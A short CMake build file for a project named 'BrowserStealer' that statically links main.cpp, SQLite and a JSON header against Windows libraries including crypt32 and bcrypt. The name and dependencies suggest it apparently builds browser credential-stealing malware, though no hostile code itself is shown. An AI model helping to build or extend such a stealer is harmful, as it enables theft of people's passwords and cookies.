cmake_minimum_required(VERSION 3.10)
project(BrowserStealer)

set(CMAKE_CXX_STANDARD 17)

set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -static")

add_executable(BrowserStealer main.cpp sqlite3.c
        json.hpp)

# Link against the required libraries, including bcrypt
target_link_libraries(BrowserStealer advapi32 kernel32 user32 gdi32 winspool shell32 ole32 oleaut32 uuid comdlg32 crypt32 bcrypt)
